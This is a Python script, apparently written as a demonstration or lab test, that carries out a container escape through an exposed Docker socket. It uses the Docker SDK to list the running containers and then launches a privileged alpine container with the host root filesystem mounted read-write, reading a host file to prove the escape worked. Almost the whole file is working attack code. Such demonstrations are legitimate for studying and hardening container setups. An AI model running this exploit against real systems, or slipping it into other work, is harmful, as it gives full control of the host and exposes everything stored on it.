#!/usr/bin/env python3
"""
Container Escape Attack #1: Docker Socket Exploitation
This is a CONTAINER-SPECIFIC attack that exploits exposed Docker sockets

Attack Vector: When /var/run/docker.sock is mounted in a container,
an attacker can use it to spawn a privileged container and escape.
"""

import docker
import time
import sys

def docker_socket_escape():
    """
    Exploit exposed Docker socket to escape container
    This is specific to Docker containerization
    """
    print("=" * 70)
    print("CONTAINER ATTACK: Docker Socket Escape")
    print("=" * 70)
    print()
    print("Attack Type: Container Escape")
    print("Target: Docker Socket (/var/run/docker.sock)")
    print("Severity: CRITICAL")
    print()
    
    try:
        # Connect to Docker socket (only works if socket is exposed)
        client = docker.from_env()
        print("[1] Docker socket is accessible from container!")
        print("    This is a critical container-specific vulnerability")
        print()
        
        # List containers (proves we can interact with Docker daemon)
        containers = client.containers.list()
        print(f"[2] Found {len(containers)} running containers:")
        for container in containers:
            print(f"    - {container.name} ({container.short_id})")
        print()
        
        # Attempt to spawn privileged container with host filesystem
        print("[3] Attempting to spawn privileged escape container...")
        print("    This container will have full host access")
        print()
        
        escape_container = client.containers.run(
            "alpine:latest",
            command="sh -c 'echo ESCAPED! && cat /host/etc/hostname && sleep 30'",
            detach=True,
            privileged=True,
            volumes={'/': {'bind': '/host', 'mode': 'rw'}},
            name="escape-container",
            remove=True
        )
        
        print(f"[✓] Escape container spawned: {escape_container.short_id}")
        print("    Container has:")
        print("    - Privileged mode enabled")
        print("    - Host filesystem mounted at /host")
        print("    - Full access to host resources")
        print()
        
        # Show logs from escape container
        time.sleep(2)
        logs = escape_container.logs().decode()
        print("[4] Escape container output:")
        print(f"    {logs}")
        print()
        
        print("=" * 70)
        print("ATTACK SUCCESSFUL: Container Escape via Docker Socket")
        print("=" * 70)
        print()
        print("Impact:")
        print("- Attacker can spawn privileged containers")
        print("- Full access to host filesystem")
        print("- Can read/write any file on host")
        print("- Complete container escape achieved")
        print()
        print("- Host filesystem access")
        
    except Exception as e:
        print(f"[✗] Attack failed: {e}")
        print()
        print("Note: This attack requires Docker socket to be exposed")
        print("      Check if /var/run/docker.sock is mounted")
        sys.exit(1)

if __name__ == "__main__":
    docker_socket_escape()
